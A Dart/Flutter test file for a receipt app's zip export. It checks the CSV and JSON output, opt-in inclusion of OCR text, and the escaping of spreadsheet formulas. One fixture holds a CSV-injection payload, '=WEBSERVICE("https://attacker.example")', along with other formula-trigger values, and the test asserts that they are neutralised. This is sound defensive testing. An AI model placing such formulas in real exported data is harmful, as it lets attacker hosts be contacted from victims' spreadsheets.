import 'dart:convert';

import 'package:archive/archive.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:receipt_trail/src/features/data_management/receipt_export_service.dart';
import 'package:receipt_trail/src/features/purchases/purchase_models.dart';

void main() {
  test('exports csv json and metadata in a zip without OCR text by default',
      () {
    final result = const ReceiptExportService().buildArchive(
      receipts: <Receipt>[_receipt()],
      exportedAt: DateTime.utc(2026, 10, 15, 3, 4, 5),
      ownerType: 'guest',
      includeOcrText: false,
    );

    expect(result.fileName, 'receipt-trail-20261015-030405.zip');
    final files = _decode(result.bytes);
    expect(
        files.keys,
        unorderedEquals(<String>[
          'receipts.csv',
          'receipts.json',
          'metadata.json',
        ]));
    expect(files['receipts.csv'], contains('「測試」咖啡, 大杯'));
    expect(files['receipts.csv'], isNot(contains('OCR 個資原文')));

    final receipts = jsonDecode(files['receipts.json']!) as List<dynamic>;
    expect(receipts.single['storeName'], '「測試」咖啡, 大杯');
    expect(receipts.single, isNot(contains('rawText')));
    final metadata =
        jsonDecode(files['metadata.json']!) as Map<String, dynamic>;
    expect(metadata['recordCount'], 1);
    expect(metadata['ownerType'], 'guest');
    expect(metadata['includesOcrText'], isFalse);
    expect(files.values.join(), isNot(contains('accessToken')));
    expect(files.values.join(), isNot(contains('password')));
  });

  test('includes OCR raw text only after explicit opt in', () {
    final result = const ReceiptExportService().buildArchive(
      receipts: <Receipt>[_receipt()],
      exportedAt: DateTime.utc(2026, 10, 15),
      ownerType: 'account',
      includeOcrText: true,
    );

    final files = _decode(result.bytes);
    expect(files['receipts.json'], contains('OCR 個資原文'));
    expect(files['receipts.csv'], contains('OCR 個資原文'));
  });

  test('neutralizes spreadsheet formulas and emits an Excel UTF-8 BOM', () {
    final dangerous = Receipt(
      id: 'formula',
      storeName: '=WEBSERVICE("https://attacker.example")',
      address: '@SUM(1+1)',
      date: DateTime.utc(2026, 10, 15),
      total: 1,
      category: SpendingCategory.other,
      items: const <ReceiptItem>[ReceiptItem(name: '+cmd', price: 1)],
      receiptNumber: '-1+1',
    );

    final result = const ReceiptExportService().buildArchive(
      receipts: <Receipt>[dangerous],
      exportedAt: DateTime.utc(2026, 10, 15),
      ownerType: 'guest',
    );
    final decodedArchive = ZipDecoder().decodeBytes(result.bytes);
    final csvBytes = decodedArchive.find('receipts.csv')!.readBytes()!;
    final csv = utf8.decode(csvBytes);

    expect(csvBytes.take(3), <int>[0xef, 0xbb, 0xbf]);
    expect(csv, contains("'=WEBSERVICE"));
    expect(csv, contains("'@SUM"));
    expect(csv, contains("'-1+1"));
  });
}

Map<String, String> _decode(List<int> bytes) {
  final archive = ZipDecoder().decodeBytes(bytes);
  return <String, String>{
    for (final file in archive)
      if (file.isFile)
        file.name: utf8.decode(file.readBytes()!, allowMalformed: false),
  };
}

Receipt _receipt() => Receipt(
      id: 'receipt-1',
      storeName: '「測試」咖啡, 大杯',
      address: '台北市測試路 1 號',
      date: DateTime.utc(2026, 10, 14, 8, 30),
      subtotal: 120,
      discount: 20,
      total: 100,
      sellerTaxId: '12345678',
      category: SpendingCategory.food,
      items: const <ReceiptItem>[
        ReceiptItem(name: '拿鐵 "大杯"', quantity: 1, price: 100),
      ],
      receiptNumber: 'AB12345678',
      rawText: 'OCR 個資原文',
      latitude: 25.033,
      longitude: 121.565,
    );
